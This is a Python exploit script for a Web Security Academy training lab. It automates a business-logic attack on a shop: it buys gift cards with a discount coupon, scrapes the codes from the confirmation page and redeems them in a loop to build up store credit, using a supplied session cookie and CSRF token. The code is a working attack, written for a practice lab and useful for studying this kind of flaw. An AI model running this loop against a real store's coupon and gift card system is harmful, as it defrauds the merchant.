import requests  # Import the requests module to handle HTTP requests
import re  # Import the re module to perform regex operations
import sys # Import sys to pass arguments
from urllib.parse import urlparse # Import urlparse to extract the lab ID

if len(sys.argv) != 4 :
    print ("Usage : python3 exploit.py <URL> <Cookies> <CSRF_Token>")
    exit()

# Get URL from user argument
given_url = urlparse(sys.argv[1])  # e.g. "https://515698441354897.web-security-academy.net/"

# Get the hostname
hostname = given_url.hostname  # "515698441354897.web-security-academy.net"

# Extract labID (part before ".")
labID = hostname.split('.')[0]

# Define session cookie for authentication
header = {
    'Cookie': f'session={sys.argv[2]}'
}

# Define CSRF token for all requests
csrf = {
    'csrf': f'{sys.argv[3]}'
}

# Define the URLs for various endpoints in the application
urls = {
    'product': f'https://{labID}.web-security-academy.net/cart',  # Endpoint to add products to the cart
    'coupon': f'https://{labID}.web-security-academy.net/cart/coupon',  # Endpoint to apply a coupon
    'checkout': f'https://{labID}.web-security-academy.net/cart/checkout',  # Endpoint to checkout the cart
    'gift': f'https://{labID}.web-security-academy.net/gift-card',  # Endpoint to redeem gift cards
    'confirm': f'https://{labID}.web-security-academy.net/cart/order-confirmation?order-confirmed=true'  # Endpoint to confirm the order
}

# Define the coupon details (replace 'SIGNUP30' with the actual coupon code)
coupon = {
    'coupon': 'SIGNUP30',  # The coupon code to apply
    'csrf': csrf['csrf']  # CSRF token required for the request
}

def product_info(productId, quantity):
    """
    Prepare the data payload for adding a product to the cart.
    :param productId: The ID of the product to add
    :param quantity: The quantity of the product to add
    :return: A dictionary containing the product information
    """
    data = {
        'productId': productId,  # The ID of the product to add
        'redir': 'PRODUCT',  # Redirection parameter after adding the product
        'quantity': min(quantity, 99)  # Limit the quantity to a maximum of 99
    }
    return data

def add_product_to_cart(data):
    """
    Add a product to the cart by sending a POST request.
    :param data: The product information (ID and quantity)
    """
    try:
        requests.post(url=urls['product'], data=data, headers=header)  # Send a POST request to add the product
        print("Product added to cart successfully.")
    except requests.RequestException as e:
        print(f"Failed to add product to cart: {e}")

def apply_coupon():
    """
    Apply a coupon to the cart by sending a POST request.
    """
    try:
        requests.post(url=urls['coupon'], data=coupon, headers=header)  # Send a POST request to apply the coupon
        print("Coupon applied successfully.")
    except requests.RequestException as e:
        print(f"Failed to apply coupon: {e}")

def checkout_cart():
    """
    Checkout the cart and retrieve gift card codes from the confirmation page.
    :return: A list of gift card codes
    """
    try:
        # Send a POST request to checkout the cart
        requests.post(url=urls['checkout'], data=csrf, headers=header)
        # Send a GET request to the order confirmation page
        confirm = requests.get(url=urls['confirm'], headers=header)
        print("Checked out successfully.")

        # Extract gift card codes from the confirmation page using regex
        gift_cards = re.findall(r'<td>(.*?)</td>', confirm.text)[5:]
        return gift_cards
    except requests.RequestException as e:
        print(f"Failed to checkout: {e}")

def redeem_gift_cards(gift_cards):
    """
    Redeem a list of gift cards by sending POST requests.
    :param gift_cards: A list of gift card codes to redeem
    """
    for card in gift_cards:
        try:
            data = {
                'gift-card': card,  # The gift card code to redeem
                'csrf': csrf['csrf']  # CSRF token required for the request
            }

            # Send a POST request to redeem the gift card
            response = requests.post(url=urls['gift'], data=data, headers=header)
            if 'Invalid gift card' in response.text:  # Check if the gift card is invalid
                break  # Stop redeeming if an invalid gift card is encountered
            else:
                print(f"Redeemed gift card successfully: {card}")
        except requests.RequestException as e:
            print(f"Failed to redeem gift card {card}: {e}")

def start(credit=100):
    """
    Main function to automate adding products, applying coupons, and redeeming gift cards
    until the required store credit is reached.
    :param credit: The initial store credit
    """
    while credit < 935.90:  # Target credit to purchase the jacket
        try:
            print(f'Current credit: {credit}')
            # Add gift cards to the cart
            add_product_to_cart(product_info(2, credit // 7))
            # Apply the coupon
            apply_coupon()
            # Checkout the cart and retrieve gift cards
            gift_cards = checkout_cart()
            # Redeem the retrieved gift cards
            redeem_gift_cards(gift_cards)

            # Get the updated store credit from the product page
            response = requests.get(url=urls['product'], headers=header)
            credit = re.findall(r'Store credit:.{2}(\d*)', response.text)  # Extract the store credit using regex
            credit = int(''.join(credit))  # Convert the extracted credit to an integer
        except requests.RequestException as e:
            print(f"Failed to retrieve store credit: {e}")
            break
    else:
        print(f'Current credit: {credit}')
        # Add the jacket to the cart
        add_product_to_cart(product_info(1, 1))
        # Apply the coupon
        apply_coupon()
        print('- Total price is within the desired range amount!\n- Now you\'re able to checkout the "Lightweight l33t leather jacket"!\n- I know it\'s more fun to buy it by yourselfðŸ˜‰')

# Start the program
start()
